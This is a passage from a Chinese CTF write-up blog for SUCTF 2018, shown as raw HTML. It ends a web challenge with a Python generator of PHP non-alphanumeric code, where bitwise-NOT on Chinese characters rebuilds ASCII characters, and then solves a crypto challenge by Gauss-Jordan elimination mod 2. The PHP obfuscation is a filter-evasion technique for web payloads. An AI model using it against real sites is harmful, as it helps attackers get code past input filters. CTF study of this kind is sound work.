</span></span><span style=display:flex><span>    d<span style=color:#f92672>=</span>gendict(index<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;$_&#39;</span>,target_chars<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;&#39;</span><span style=color:#f92672>.</span>join(set(code)))
</span></span><span style=display:flex><span>    res<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;$__=&#39;</span><span style=color:#f92672>+</span><span style=color:#e6db74>&#39;.&#39;</span><span style=color:#f92672>.</span>join(map(<span style=color:#66d9ef>lambda</span> x:d[x],code))
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> res
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>code<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\]^_`abcdefghijklmnopqrstuvwxyz{|}~&#39;</span>
</span></span><span style=display:flex><span>print(gencode(code))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># &lt;?php </span>
</span></span><span style=display:flex><span><span style=color:#75715e># $_=_==_;</span>
</span></span><span style=display:flex><span><span style=color:#75715e># $__=~俱[$_].~得[$_].~住[$_].~伽[$_].~结[$_].~二[$_].~鹫[$_].~一[$_].~已[$_].~足[$_].~流[$_].~索[$_].~峰[$_].~精[$_].~山[$_].~尽[$_].~诸[$_].~宣[$_].~正[$_].~第[$_].~竟[$_].~誓[$_].~马[$_].~言[$_].~解[$_].~如[$_].~神[$_].~大[$_].~声[$_].~梵[$_].~顶[$_].~堪[$_].~城[$_].~果[$_].~坛[$_].~真[$_].~相[$_].~皆[$_].~百[$_].~是[$_].~闻[$_].~薄[$_].~数[$_].~生[$_].~响[$_].~和[$_].~摩[$_].~萨[$_].~叶[$_].~王[$_].~千[$_].~猛[$_].~苾[$_].~办[$_].~所[$_].~我[$_].~自[$_].~熙[$_].~慧[$_].~脱[$_].~烦[$_].~邬[$_].~恼[$_];</span>
</span></span><span style=display:flex><span><span style=color:#75715e># var_dump($__);</span>
</span></span><span style=display:flex><span><span style=color:#75715e># // string(63) &#34;@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\]^_`abcdefghijklmnopqrstuvwxyz{|}~&#34;</span>
</span></span></code></pre></td></tr></table></div></div><h1 id=crypto>CRYPTO<a hidden class=anchor aria-hidden=true href=#crypto>#</a></h1><h2 id=magic>Magic<a hidden class=anchor aria-hidden=true href=#magic>#</a></h2><p>把magic视为256x256的由0，1组成的矩阵M，把cipher视为256x1的矩阵C，把key视为256x1的矩阵K，已知M,C，且M*K = C (.mod 2)，求K。</p><p>可以采用<code>Gauss-Jordan 消元法</code> 将增广矩阵<code>[M|C]</code> 简化为行阶梯形矩阵，那么变化后的C就是我们的解K。</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-15-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-15-1> 1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-15-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-15-2> 2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-15-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-15-3> 3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-15-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-15-4> 4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-15-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-15-5> 5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-15-6><a style=outline:none;text-decoration:none;color:inherit href=#hl-15-6> 6</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-15-7><a style=outline:none;text-decoration:none;color:inherit href=#hl-15-7> 7</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-15-8><a style=outline:none;text-decoration:none;color:inherit href=#hl-15-8> 8</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-15-9><a style=outline:none;text-decoration:none;color:inherit href=#hl-15-9> 9</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-15-10><a style=outline:none;text-decoration:none;color:inherit href=#hl-15-10>10</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-15-11><a style=outline:none;text-decoration:none;color:inherit href=#hl-15-11>11</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-15-12><a style=outline:none;text-decoration:none;color:inherit href=#hl-15-12>12</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-15-13><a style=outline:none;text-decoration:none;color:inherit href=#hl-15-13>13</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-15-14><a style=outline:none;text-decoration:none;color:inherit href=#hl-15-14>14</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-15-15><a style=outline:none;text-decoration:none;color:inherit href=#hl-15-15>15</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-15-16><a style=outline:none;text-decoration:none;color:inherit href=#hl-15-16>16</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-15-17><a style=outline:none;text-decoration:none;color:inherit href=#hl-15-17>17</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span>read_to_int_array <span style=color:#f92672>=</span> <span style=color:#66d9ef>lambda</span> x:[map(int,list(bin(int(line,<span style=color:#ae81ff>16</span>))[<span style=color:#ae81ff>2</span>:]<span style=color:#f92672>.</span>zfill(<span style=color:#ae81ff>256</span>))) <span style=color:#66d9ef>for</span> line <span style=color:#f92672>in</span> open(x)<span style=color:#f92672>.</span>readlines()]
</span></span><span style=display:flex><span>cipher <span style=color:#f92672>=</span> read_to_int_array(<span style=color:#e6db74>&#39;cipher.txt&#39;</span>)[<span style=color:#ae81ff>0</span>]
</span></span><span style=display:flex><span>magic <span style=color:#f92672>=</span> read_to_int_array(<span style=color:#e6db74>&#39;magic.txt&#39;</span>)
</span></span><span style=display:flex><span>dim<span style=color:#f92672>=</span>len(cipher)
</span></span><span style=display:flex><span><span style=color:#66d9ef>for</span> col <span style=color:#f92672>in</span> range(dim):
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> row <span style=color:#f92672>in</span> range(col,dim):
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> magic[row][col]<span style=color:#f92672>==</span><span style=color:#ae81ff>1</span>:
</span></span><span style=display:flex><span>            magic[col],magic[row]<span style=color:#f92672>=</span>magic[row],magic[col]
</span></span><span style=display:flex><span>            cipher[col],cipher[row]<span style=color:#f92672>=</span>cipher[row],cipher[col]
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>break</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> row <span style=color:#f92672>in</span> range(dim):
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> magic[row][col]<span style=color:#f92672>==</span><span style=color:#ae81ff>1</span> <span style=color:#f92672>and</span> row<span style=color:#f92672>!=</span>col:
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>for</span> each_in_row <span style=color:#f92672>in</span> range(dim):
</span></span><span style=display:flex><span>                magic[row][each_in_row]<span style=color:#f92672>^=</span>magic[col][each_in_row]
</span></span><span style=display:flex><span>            cipher[row]<span style=color:#f92672>^=</span>cipher[col]
</span></span><span style=display:flex><span>print <span style=color:#e6db74>&#34;flag{</span><span style=color:#e6db74>%s</span><span style=color:#e6db74>}&#34;</span><span style=color:#f92672>%</span>hex(int(<span style=color:#e6db74>&#39;&#39;</span><span style=color:#f92672>.</span>join(map(str,cipher)),<span style=color:#ae81ff>2</span>))[<span style=color:#ae81ff>2</span>:<span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>]<span style=color:#f92672>.</span>decode(<span style=color:#e6db74>&#39;hex&#39;</span>)
</span></span><span style=display:flex><span><span style=color:#75715e>#flag{Now_you_know_the_Hill_Cipher_xwg}</span>
</span></span></code></pre></td></tr></table></div></div><p>参考链接：</p><ul><li><a href=https://blog.csdn.net/u010182633/article/details/45225179>https://blog.csdn.net/u010182633/article/details/45225179</a></li><li><a href=https://github.com/0h2o/docs/tree/gh-pages/WriteUps/SUCTF2018/CNSS_SUCTF_WRITEUP>https://github.com/0h2o/docs/tree/gh-pages/WriteUps/SUCTF2018/CNSS_SUCTF_WRITEUP</a></li><li>也可尝试借助matlab的 <a href=https://ww2.mathworks.cn/help/matlab/ref/rref.html>rref</a> 。</li></ul><h1 id=题目备份>题目备份<a hidden class=anchor aria-hidden=true href=#题目备份>#</a></h1><p><a href=https://github.com/findneo/ctfgodown/tree/master/20180527-suctf>https://github.com/findneo/ctfgodown/tree/master/20180527-suctf</a></p></div><footer class=post-footer><ul class=post-tags></ul><nav class=paginav><a class=prev href=https://ret2neo.cn/post/180706doubanmovie/><span class=title>« Prev</span><br><span>根据豆瓣观影记录生成海报</span></a>
<a class=next href=https://ret2neo.cn/post/180512kaliondocker/><span class=title>Next »</span><br><span>在win10家庭版上的Docker中使用Kali</span></a></nav></footer></article></main><footer class=footer><span>&copy; 2026 <a href=https://ret2neo.cn/>闲言语</a></span>
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
        <a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg></a><script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-2303473689051162" crossorigin=anonymous></script><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script><script>document.querySelectorAll("pre > code").forEach(e=>{const n=e.parentNode.parentNode,t=document.createElement("button");t.classList.add("copy-code"),t.innerHTML="copy";function s(){t.innerHTML="copied!",setTimeout(()=>{t.innerHTML="copy"},2e3)}t.addEventListener("click",t=>{if("clipboard"in navigator){navigator.clipboard.writeText(e.textContent),s();return}const n=document.createRange();n.selectNodeContents(e);const o=window.getSelection();o.removeAllRanges(),o.addRange(n);try{document.execCommand("copy"),s()}catch{}o.removeRange(n)}),n.classList.contains("highlight")?n.appendChild(t):n.parentNode.firstChild==n||(e.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?e.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(t):e.parentNode.appendChild(t))})</script></body></html>